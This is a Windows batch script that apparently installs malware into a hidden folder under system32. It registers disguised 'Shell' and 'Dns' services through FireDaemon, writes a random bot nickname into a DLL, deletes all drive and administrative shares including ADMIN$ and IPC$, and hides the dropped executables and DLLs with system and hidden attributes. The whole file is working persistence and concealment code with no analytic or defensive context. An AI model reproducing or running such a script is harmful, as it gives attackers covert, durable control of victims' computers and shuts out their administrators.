   @echo off
   SET MXHOME=C:\WINDOWS\system32\oobe\sample

   SET MXBIN=C:\WINDOWS\system32\oobe\sample

   echo user_nick [mFW]-%random% >>C:\WINDOWS\system32\oobe\sample\jetconv.dll

   C:\WINDOWS\system32\oobe\sample\firedaemon -i Shell "C:\WINDOWS\system32\oobe\sample" "C:\WINDOWS\system32\oobe\sample\jetconv.exe" "jetconv.dll" Y 0 0 0 Y

   C:\WINDOWS\system32\oobe\sample\firedaemon -i Dns "C:\WINDOWS\system32\oobe\sample" "C:\WINDOWS\system32\oobe\sample\kb16.exe" "/h" Y 0 0 0 Y

   net start Shell

   net start Dns

   net share /delete C /y
   net share /delete C$ /y
   net share /delete D$ /y
   net share /delete E$ /y
   net share /delete F$ /y
   net share /delete G$ /y
   net share /delete H$ /y
   net share /delete I$ /y
   net share /delete J$ /y
   net share /delete K$ /y
   net share /delete L$ /y
   net share /delete M$ /y
   net share /delete N$ /y
   net share /delete O$ /y
   net share /delete P$ /y
   net share /delete Q$ /y
   net share /delete R$ /y
   net share /delete S$ /y
   net share /delete T$ /y
   net share /delete U$ /y
   net share /delete V$ /y
   net share /delete W$ /y
   net share /delete X$ /y
   net share /delete Y$ /y
   net share /delete Z$ /y
   net share /delete ADMIN$
   net share /delete IPC$

   attrib +s +h C:\WINDOWS\system32\oobe\sample\cygcrypt-0.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\cygwin1.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\Dbmsspxn.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\Dbmsspxn.dll.bkup
   attrib +s +h C:\WINDOWS\system32\oobe\sample\Dbmsspxn.dll.txt
   attrib +s +h C:\WINDOWS\system32\oobe\sample\Estier2.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\firedaemon.exe
   attrib +s +h C:\WINDOWS\system32\oobe\sample\Instrsa.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\jetconv.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\jetconv.exe
   attrib +s +h C:\WINDOWS\system32\oobe\sample\Jgdw400.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\Jgdw400.dll.bkup
   attrib +s +h C:\WINDOWS\system32\oobe\sample\Jgdw400.dll.tmp
   attrib +s +h C:\WINDOWS\system32\oobe\sample\kb16.exe
   attrib +s +h C:\WINDOWS\system32\oobe\sample\ServUStartUpLog.txt
   attrib +s +h C:\WINDOWS\system32\oobe\sample\siz.bat
   attrib +s +h C:\WINDOWS\system32\oobe\sample\wel.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\wincbsmngmt.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\Dindi.dll
   attrib +s +h C:\WINDOWS\system32\oobe\sample\ntlog.exe
   attrib +s +h C:\WINDOWS\system32\oobe\sample\fast.exe
